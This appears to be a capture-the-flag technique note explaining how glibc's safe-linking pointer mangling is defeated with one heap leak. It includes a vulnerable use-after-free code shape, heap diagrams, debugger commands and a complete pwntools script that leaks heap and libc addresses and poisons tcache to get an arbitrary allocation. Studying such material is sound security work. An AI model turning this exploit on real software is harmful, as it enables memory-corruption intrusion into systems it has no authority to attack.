---
title: "Safe-Linking - Defeating PROTECT_PTR With One Heap Leak"
category: pwn
subcategory: heap
type: technique
tags: [safe-linking, protect-ptr, reveal-ptr, tcache, fastbin, heap-leak, heap, uaf, double-free, mangle, demangle, alignment-check, pwndbg, gef, pwntools, glibc]
difficulty: medium
summary: "glibc 2.32+ XORs singly-linked bin pointers with the chunk address >> 12; one heap leak recovers the key and the attack proceeds unchanged."
when_to_use:
  - "The challenge libc is 2.32 or newer and your tcache/fastbin fd reads back as a small value"
  - "You have a tcache poisoning primitive but the poison is being rejected"
  - "You have a partial leak of a freed chunk's next pointer and need the heap base"
  - "You need to write a mangled pointer and do not know the heap address yet"
tools: [pwntools, pwndbg, gef]
related: [heap-tcache-poisoning, heap-internals-primer, heap-use-after-free, heap-version-differences, glibc-heap-cheatsheet]
---

## TL;DR

Since glibc 2.32, `tcache->entries[]` and fastbin `fd` are stored as
`(address_of_the_pointer_field >> 12) ^ real_pointer`. The "key" is just the heap page
number, so any heap leak breaks it - and a freed chunk that is the *last* entry in its
bin stores `(pos >> 12) ^ 0`, i.e. the key itself, in plaintext. Safe-linking is a
speed bump, not a mitigation.

## Recognise it

- You `free()` a single chunk, `show()` it, and get back something like
  `0x000055f3a1c2` instead of a full `0x55f3a1c2d2a0`-style heap pointer.
- The leak is always ~5-6 nibbles shorter than a real pointer and its low 12 bits look
  like the high bits of a heap address.
- `strings libc.so.6 | grep "GNU C Library"` says 2.32 or later.
- A tcache poison that worked on the 2.31 version of the challenge now aborts with
  `malloc(): unaligned tcache chunk detected`.

## Vulnerable code shape

Safe-linking is not a bug, it is the defence. The *bug* is still the ordinary one:

```c
void do_free(void) {
    int i = read_idx();
    free(ptr[i]);                /* ptr[i] not NULLed */
}
void do_show(void) {
    int i = read_idx();
    write(1, ptr[i], sz[i]);     /* leaks the mangled next pointer */
}
void do_edit(void) {
    int i = read_idx();
    read(0, ptr[i], sz[i]);      /* lets you write a mangled next pointer back */
}
```

## Theory

Targets: glibc 2.32 - 2.39.

```c
#define PROTECT_PTR(pos, ptr)  \
  ((__typeof__ (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)        PROTECT_PTR (&ptr, ptr)
```

`pos` is the address of the storage slot, which for a tcache entry is the chunk's user
address (`chunk + 0x10`) and for a fastbin entry is the same. Because both the slot and
the pointed-to chunk live in the same heap, `pos >> 12` is essentially the heap page
number - typically a 36-bit value like `0x5606f0a3c`.

Three consequences:

1. **The key is not secret from the heap.** `key = heap_page_addr >> 12`.
   One leaked heap pointer (from *any* source: an unsorted-bin `bk` that still points
   into the heap, a largebin `fd_nextsize`, an application pointer, a
   `tcache_perthread_struct` address) gives you the key for the whole heap.
2. **A lone freed chunk leaks the key in plaintext.** If the bin has exactly one
   entry, its `next` is `NULL`, so the stored value is `(pos >> 12) ^ 0 = pos >> 12`.
   Shift it back left by 12 and you have the chunk's page. This is the canonical
   "free one chunk and read it" heap leak on 2.32+.
3. **A general mangled value can be unmangled with no prior knowledge**, because the
   top 12 bits of `pos >> 12` are zero, so the top 12 bits of the stored value are the
   real pointer's top 12 bits. Peel 12 bits at a time.

Safe-linking also enforces alignment:

```c
if (__glibc_unlikely (!aligned_OK (REVEAL_PTR (e->next))))
  malloc_printerr ("malloc(): unaligned tcache chunk detected");
```

(2.32 checks the fastbin path, 2.34 tightened the tcache path too.) Consequence:
your poison target must be 16-byte aligned, which kills the `hook - 0x23` misalignment
tricks.

### The algebra you actually type

```
want:   entries[i] == TARGET after one tcache_get
store:  (CHUNK_USER_ADDR >> 12) ^ TARGET
```

where `CHUNK_USER_ADDR` is the address of the chunk you are editing (not the target).

## Attack

glibc 2.35, UAF edit + show, target `__free_hook` replacement (use an exit handler or
FSOP - here we just demonstrate landing an allocation on an arbitrary aligned address):

1. `alloc(0, 0x48)` -> A.
2. `free(0)` - tcache[0x50] has exactly one entry, `A->next = (A_user >> 12) ^ 0`.
3. `show(0)` -> read 8 bytes = `A_user >> 12`. **Heap key obtained.**
   `A_user = leak << 12 | (A_user & 0xFFF)`; the low 12 bits come from the known
   in-page offset of A (usually `0x2a0 + n*chunk`, or just brute the 0x10-aligned
   offsets if you must - in practice you read it from the debugger once).
4. `alloc(1, 0x48)` - take A back so the bin is clean.
5. `alloc(2, 0x48)` -> B, `alloc(3, 0x48)` -> C.
6. `free(2)`, `free(3)` - tcache[0x50]: C -> B.
7. `edit(3, p64(mangle(C_user, TARGET)))` - tcache[0x50]: C -> TARGET.
8. `alloc(4, 0x48)` - returns C.
9. `alloc(5, 0x48, payload)` - returns TARGET; the write lands there.

## Heap state

```text
step 2-3: the "lone chunk" key leak

  tcache->entries[3] --> A (user = 0x55a3b1e4c2a0)
  A: +0x00 | next = PROTECT_PTR(&A->next, NULL)
           |      = (0x55a3b1e4c2a0 >> 12) ^ 0
           |      = 0x00000055a3b1e4c     <-- show(0) prints this
     +0x08 | key  = tcache_key (random on 2.34+)

  heap_key  = 0x55a3b1e4c
  A_user    = (heap_key << 12) | 0x2a0 = 0x55a3b1e4c2a0


step 6-7: poisoning with the mangle

  tcache->entries[3] --> C (user = 0x55a3b1e4c340)
  C: +0x00 | next = (0x55a3b1e4c340 >> 12) ^ TARGET |
                     ^-- 0x55a3b1e4c  (same page, same key)

  tcache_get(C): entries[3] = REVEAL_PTR(C->next)
                            = ((&C->next) >> 12) ^ stored
                            = 0x55a3b1e4c ^ (0x55a3b1e4c ^ TARGET)
                            = TARGET                       OK
  aligned_OK(TARGET) must hold  (TARGET & 0xf == 0)
```

## Exploit

```python
#!/usr/bin/env python3
"""Safe-linking helpers + a full 2.32+ tcache poison.

The two functions you actually reuse are mangle() and demangle(); the rest is a
standard alloc/free/show/edit driver.

Usage:
    ./exploit.py                      # runs the self-test, then the local exploit
    ./exploit.py SELFTEST             # self-test only, no binary needed
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
import random
import sys


def mangle(pos: int, ptr: int) -> int:
    """PROTECT_PTR(pos, ptr). `pos` = address of the next/fd field being written."""
    return (pos >> 12) ^ ptr


def demangle(val: int) -> int:
    """REVEAL_PTR without knowing the heap: peel 12 bits at a time from the top.

    Works because (pos >> 12) has at most 52 significant bits, so the top 12 bits
    of the stored value equal the top 12 bits of the real pointer.
    """
    mask = 0xFFF << 52
    key = 0
    for _ in range(5):
        chunk = ((key ^ val) & mask) >> 12
        key |= chunk
        mask >>= 12
    return key ^ val


def heap_key_from_lone_chunk(leak: int) -> int:
    """A bin with one entry stores (pos >> 12) ^ 0. Recover the page number."""
    return leak


def heap_addr_from_lone_chunk(leak: int, in_page_offset: int) -> int:
    """Turn the lone-chunk leak into the chunk's full user address."""
    return (leak << 12) | (in_page_offset & 0xFFF)


def _selftest() -> None:
    rnd = random.Random(0xC0FFEE)
    for _ in range(2000):
        page = rnd.randrange(0x550000000, 0x7FFFFFFFF) << 12
        pos = page + rnd.randrange(0x290, 0x1000, 0x10)
        ptr = page + rnd.randrange(0x290, 0x1000, 0x10)
        stored = mangle(pos, ptr)
        assert demangle(stored) == ptr, (hex(pos), hex(ptr), hex(stored))
    # lone-chunk case: next == NULL
    pos = 0x55A3B1E4C2A0
    stored = mangle(pos, 0)
    assert stored == pos >> 12
    assert heap_addr_from_lone_chunk(heap_key_from_lone_chunk(stored), 0x2A0) == pos
    # the mangle really is an involution on the key
    target = 0x7F00DEADB000
    assert mangle(pos, mangle(pos, target)) == target
    print("[+] safe-linking self-test passed (2000 random round-trips)")


def run_exploit() -> None:
    from pwn import ELF, args, context, log, p64, process, remote, u64

    BINARY = args.BIN or "./chal"
    LIBC = args.LIBC or "./libc.so.6"
    context.binary = ELF(BINARY, checksec=False)
    context.log_level = args.LOG or "info"
    libc = ELF(LIBC, checksec=False)

    SIZE = 0x48                       # -> 0x50 chunk, tcache index 3
    CHUNK = 0x50
    FIRST_CHUNK_OFF = 0x2A0           # heap_base + 0x290 header, user at +0x2a0

    io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
          if args.REMOTE else process([BINARY]))

    def menu(c):
        io.sendlineafter(b"> ", str(c).encode())

    def alloc(i, n, d=b"A"):
        menu(1)
        io.sendlineafter(b"index: ", str(i).encode())
        io.sendlineafter(b"size: ", str(n).encode())
        io.sendafter(b"content: ", d)

    def free(i):
        menu(2)
        io.sendlineafter(b"index: ", str(i).encode())

    def show(i):
        menu(3)
        io.sendlineafter(b"index: ", str(i).encode())
        io.recvuntil(b"content: ")
        return io.recvline().rstrip(b"\n")

    def edit(i, d):
        menu(4)
        io.sendlineafter(b"index: ", str(i).encode())
        io.sendafter(b"content: ", d)

    def lk(raw):
        return u64(raw.ljust(8, b"\x00")[:8])

    # --- 1. heap key from a lone tcache entry -----------------------------
    alloc(0, SIZE, b"A" * 8)
    free(0)
    key = lk(show(0))
    log.success("safe-linking key (heap >> 12) = %#x", key)
    a_user = heap_addr_from_lone_chunk(key, FIRST_CHUNK_OFF)
    log.success("chunk A user address          = %#x", a_user)
    alloc(0, SIZE, b"A" * 8)          # take A back, bin is empty again

    # --- 2. libc leak (0x418 skips tcache) --------------------------------
    alloc(8, 0x418, b"leaker")
    alloc(9, 0x18, b"guard")
    free(8)
    libc.address = lk(show(8)) - 0x60 - libc.sym["main_arena"]
    log.success("libc base                     = %#x", libc.address)

    # --- 3. poison --------------------------------------------------------
    alloc(2, SIZE, b"B" * 8)
    alloc(3, SIZE, b"C" * 8)
    b_user = a_user + CHUNK           # A, B, C are laid out consecutively
    c_user = a_user + 2 * CHUNK
    free(2)
    free(3)                           # tcache[3]: C -> B

    target = libc.sym["_IO_2_1_stdout_"]
    assert target % 0x10 == 0, "2.32+ demands a 16-byte aligned target"
    edit(3, p64(mangle(c_user, target)))
    log.info("tcache[3] head -> %#x", target)

    alloc(4, SIZE, b"consume C")
    alloc(5, SIZE, p64(0) * 2)        # allocation lands on `target`
    log.success("arbitrary allocation at %#x", target)

    io.interactive()


if __name__ == "__main__":
    _selftest()
    if "SELFTEST" not in sys.argv:
        run_exploit()
```

## Variants & pitfalls

- **You do not need the *exact* in-page offset** of the leaked chunk if you use the
  general `demangle()` on a *non-lone* entry: free two chunks, read the second one's
  `next`, and `demangle()` recovers the first chunk's address directly.
- **Leading zero bytes.** `(heap >> 12)` is ~5 bytes, so the top 3 bytes of the stored
  value are `\x00`. A `puts()`-based `show` truncates nothing (the nulls are at the
  end), but a `strlen`-based length check may report 5. Use `recvline()` and
  `ljust(8, b"\x00")`.
- **Alignment.** `TARGET & 0xf` must be 0. Check with
  `nm -D libc.so.6 | grep <symbol>` before committing.
- **Fastbins are mangled too** since 2.32, with the same macro. The `fastbin_index`
  size check still applies on top.
- **`tcache_perthread_struct` entries are NOT mangled** - only the `next` fields inside
  chunks are. If you get an allocation on the struct itself you can write raw pointers
  into `entries[]`, skipping safe-linking entirely. That is the cleanest 2.32+ primitive.
- **2.34+ random `tcache_key`.** The double-free detector's key is now
  `tcache_key` from `tcache_init` (random per process), not the struct address, so you
  cannot predict it - but you never needed to, you just overwrite it with anything.

## Debugging

```text
pwndbg> tcache                      # pwndbg demangles entries[] for you
pwndbg> bins
pwndbg> p/x $heap_base
pwndbg> p/x ((unsigned long)$heap_base >> 12)      # the key
pwndbg> x/2gx <chunk_user>                          # raw mangled next, raw key
pwndbg> vis_heap_chunks 8
gef>  heap bins tcache               # gef also reveals safe-linked pointers
```

```bash
# Confirm safe-linking is compiled in (2.32+ always has it; check the version).
strings ./libc.so.6 | grep -m1 "GNU C Library"
# Confirm your target symbol is 16-byte aligned.
nm -D ./libc.so.6 | awk '$3=="_IO_2_1_stdout_"{print $1}'
```

## Tools

- `pwndbg` and `gef` both unmangle tcache/fastbin pointers in their `bins` output.
- `pwntools` - keep `mangle()`/`demangle()` in a shared `heaplib.py`.

## References

- shellphish `how2heap`: `safe_link.c`.
- glibc `malloc/malloc.c`: `PROTECT_PTR`, `REVEAL_PTR`, `tcache_get`, `_int_free`.
- Check Point Research introduced the mitigation under the name "Safe-Linking".
